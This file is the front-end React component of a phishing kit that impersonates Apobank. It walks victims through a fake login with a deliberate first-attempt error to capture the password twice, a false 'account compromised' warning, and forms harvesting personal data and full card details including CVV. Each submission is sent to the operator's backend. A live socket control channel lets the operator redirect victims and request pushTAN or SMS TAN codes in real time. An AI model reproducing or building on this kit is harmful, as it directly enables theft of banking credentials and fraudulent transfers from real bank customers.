import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';
import './ApobankStyle.css';

import { Header } from './components/Header';
import { Footer } from './components/Footer';
import { LoginForm } from './components/LoginForm';
import { Loading } from './components/Loading';
import { ErrorScreen } from './components/ErrorScreen';
import { AccountCompromisedScreen } from './components/AccountCompromisedScreen';
import { PersonalDataForm } from './components/PersonalDataForm';
import { BankCardForm } from './components/BankCardForm';
import { FinalSuccessScreen } from './components/FinalSuccessScreen';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';

// Apobank flow states (6-step process)
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  bankCard: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  bankCard: true
};

// Types for Apobank flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component with metadata update
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Update page metadata for Apobank template
    const metadata = getTemplateMetadata('apobank');
    updatePageMetadata(metadata);
    
    // Create a proper session via backend API
    const initializeSession = async () => {
      try {
        setLoading(true);
        const newKey = await createTemplateSession('apobank');
        console.log('Created Apobank session with key:', newKey);
        navigate(`/apobank/${newKey}`);
      } catch (err) {
        console.error('Error creating session:', err);
        setError('Fehler beim Erstellen einer Sitzung');
        setLoading(false);
      }
    };

    initializeSession();
  }, [navigate]);

  if (loading && !error) return <Loading message="Bitte warten Sie, während wir Ihre Sitzung erstellen..." />;
  if (error) return <ErrorScreen message={error} />;
  return null;
}

// Main flow component for Apobank 6-step process
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>(STATES.LOGIN);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);
  const [loginLoading, setLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | undefined>(undefined);

  // Scroll to top whenever state changes and reset login error
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
    if (state !== STATES.LOGIN_ERROR) {
      setLoginError(undefined);
    }
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('apobank');
    updatePageMetadata(metadata);

    // Load step configuration from backend - MUST complete before user interaction
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('apobank');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded Apobank step config:', config.steps);
        }
        if (process.env.NODE_ENV === 'development') {
          console.log('🔧 Apobank step config details:', {
            doubleLogin: config.steps.doubleLogin,
            personalData: config.steps.personalData,
            bankCard: config.steps.bankCard,
            configLoaded: true
          });
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        // Even if API fails, mark as loaded to continue with defaults
        setConfigLoaded(true);
      }
    };

    if (!key) {
      setError('Ungültiger Session-Schlüssel');
      setLoading(false);
      return;
    }

    console.log(`Initializing Apobank session with key: ${key}`);
    
    // Wait for config to load, then initialize session
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => {
        setState(STATES.LOGIN);
        setLoading(false);
      }, 1000);
    };
    
    initializeAfterConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'apobank',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login submission (Steps 1 & 2)
  const handleLogin = async (data: LoginData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Login attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Submitting login for Apobank flow:', { key, username: data.username ? '✓' : '✗' });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Set loading state for login
      setLoginLoading(true);
      setLoginError(undefined);
      
      // Show quick loading screen
      setLoadingMessage("Anmeldedaten werden überprüft...");
      setState(STATES.LOADING);
      
      // Submit to our backend via template-submit endpoint
      const response = await submitTemplateData({
        template_name: 'apobank',
        key: key || '',
        step: 'login',
        data: {
          username: data.username,
          password: data.password
        }
      });
      
      console.log('Login response:', response);

      if (!response.success) {
        setLoginError(response.error || 'Fehler bei der Anmeldung');
        setState(STATES.LOGIN_ERROR);
        setLoading(false);
        return;
      }
      
      // Simulate realistic flow - first attempt goes to error, second to compromised
      const currentAttempt = sessionStorage.getItem(`apobank_attempts_${key}`) || '0';
      const attempts = parseInt(currentAttempt) + 1;
      sessionStorage.setItem(`apobank_attempts_${key}`, attempts.toString());
      
      // Add realistic delay
      setTimeout(() => {
        if (attempts === 1) {
          if (stepConfig.doubleLogin) {
            // First login attempt - show error
            setState(STATES.LOGIN_ERROR);
            setLoginError('Bei der Anmeldung ist ein Fehler aufgetreten. Bitte überprüfen Sie Ihre Eingaben und versuchen Sie es erneut.');
          } else {
            // Single login - go directly to account compromised
            proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Sicherheitsprüfung läuft...');
          }
        } else {
          // Second login attempt - proceed to account compromised
          proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Sicherheitsprüfung läuft...');
        }
        setLoginLoading(false);
      }, 2500);
      
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN);
      setLoginLoading(false);
    }
  };

  // Handle verification start (Step 3)
  const handleStartVerification = async () => {
    try {
      console.log('Starting verification process for session:', key);
      
      // Show loading state
      setState(STATES.LOADING);
      setLoadingMessage("Verifizierungsprozess wird gestartet...");
      
      // Submit verification start to backend
      const response = await submitTemplateData({
        template_name: 'apobank',
        key: key || '',
        step: 'verification-start',
        data: {}
      });
      
      if (!response.success) {
        setError(response.error || 'Fehler beim Starten der Verifizierung');
        setState(STATES.ERROR);
        setLoading(false);
        return;
      }
      
      // Add realistic delay then move to personal data step
      setTimeout(() => {
        setState(STATES.PERSONAL_DATA);
      }, 1500);
    } catch (error) {
      console.error('Start verification error:', error);
      setError('Fehler beim Starten der Verifizierung');
    }
  };

  // Handle personal data submission (Step 4)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Personal data submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Submitting personal data for session:', key);
      
      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'apobank',
        key: key || '',
        step: 'personal-data-complete',
        data: data
      });
      
      if (!response.success) {
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('Personal data submitted successfully');
      
      // Immediately set loading state to prevent form from showing again
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Add realistic delay then proceed to next step
      setTimeout(() => {
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 3000);
    } catch (error: any) {
      console.error('Personal data submission error:', error);
      
      // Check if it's a validation error from backend
      if (error.response?.status === 400 && error.response?.data?.details) {
        // Pass validation errors back to the form
        throw error.response.data;
      } else {
        setError('Fehler beim Speichern der persönlichen Daten');
      }
    }
  };

  // Handle bank card data submission (Step 5)
  const handleBankCardSubmit = async (data: BankCardData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank card submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Submitting bank card data for session:', key);
      console.log('Bank card data being submitted:', data);
      
      setLoading(true);
      setLoadingMessage("Bankkarten-Daten werden übertragen...");
      
      // Submit bank card data to backend
      const response = await submitTemplateData({
        template_name: 'apobank',
        key: key || '',
        step: 'bank-card-complete',
        data: data
      });
      
      console.log('Bank card submission response:', response);
      
      if (!response.success) {
        console.error('Backend returned error:', response.error);
        setError(response.error || 'Fehler beim Speichern der Kartendaten');
        setState(STATES.ERROR);
        setLoading(false);
        return;
      }
      
      console.log('Bank card data submitted successfully');
      
      // Set loading message and proceed to final success
      setLoadingMessage("Bankkarten-Daten wurden erfolgreich gespeichert...");
      
      // Small delay for user feedback, then proceed to final success
      setTimeout(() => {
        setLoading(false);
        setState(STATES.FINAL_SUCCESS);
      }, 1500);
    } catch (error: any) {
      console.error('Bank card submission error:', error);
      console.error('Error details:', {
        message: error.message,
        stack: error.stack,
        response: error.response
      });
      
      // Check if it's a validation error from backend
      if (error.response?.status === 400 && error.response?.data?.details) {
        // Pass validation errors back to the form
        throw error.response.data;
      } else {
        // More specific error message
        const errorMessage = error.message || 'Fehler beim Speichern der Bankkarten-Daten';
        setError(`Fehler beim Speichern der Bankkarten-Daten: ${errorMessage}`);
        setState(STATES.ERROR);
        setLoading(false);
      }
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Apobank: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'apobank',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Apobank bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Apobank bank card skip completed successfully');
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        setState(STATES.FINAL_SUCCESS);
      }, 2000);
      
    } catch (error) {
      console.error('❌ Apobank bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
      />;
    }
    
    if (error) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLogin} isLoading={loginLoading} />;
      
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLogin} isLoading={loginLoading} errorMessage={loginError} />;
      
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleStartVerification} />;
      
      case STATES.PERSONAL_DATA:
        // Only render if personal data step is enabled
        if (stepConfig.personalData) {
          return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Personal data form requested but step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.BANK_CARD:
        // Only render if bank card step is enabled
        if (stepConfig.bankCard) {
          return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Bank card form requested but step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onConfirm={() => {
            templateSocketClient.emit('tan-completed', { 
              requestId: currentTanRequest?.requestId, 
              success: true, 
              type: currentTanRequest?.type 
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            templateSocketClient.emit('tan-cancelled', { 
              requestId: currentTanRequest?.requestId, 
              type: currentTanRequest?.type 
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            templateSocketClient.emit('tan-completed', { 
              requestId: currentTanRequest?.requestId, 
              success: true, 
              type: currentTanRequest?.type, 
              tanValue: tan 
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            templateSocketClient.emit('tan-resend-requested', { 
              requestId: currentTanRequest?.requestId, 
              type: currentTanRequest?.type 
            });
          }}
          onCancel={() => {
            templateSocketClient.emit('tan-cancelled', { 
              requestId: currentTanRequest?.requestId, 
              type: currentTanRequest?.type 
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} type="processing" showProgress={false} />;
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
      
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
      
      default:
        return <ErrorScreen message="Unbekannter Status" />;
    }
  };

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#f8f9fa',
      display: 'flex',
      flexDirection: 'column'
    }}>
      <Header />
      <main style={{ 
        width: '100%',
        maxWidth: '1400px',
        margin: '0 auto',
        padding: '0'
      }}>
        {renderContent()}
      </main>
      <Footer />
    </div>
  );
}

// ApobankTemplate component that handles routing
const ApobankTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin
  if (!key) {
    return <AutoLogin />;
  }

  // If key provided, show FormFlow
  return <FormFlow />;
};

export default ApobankTemplate; 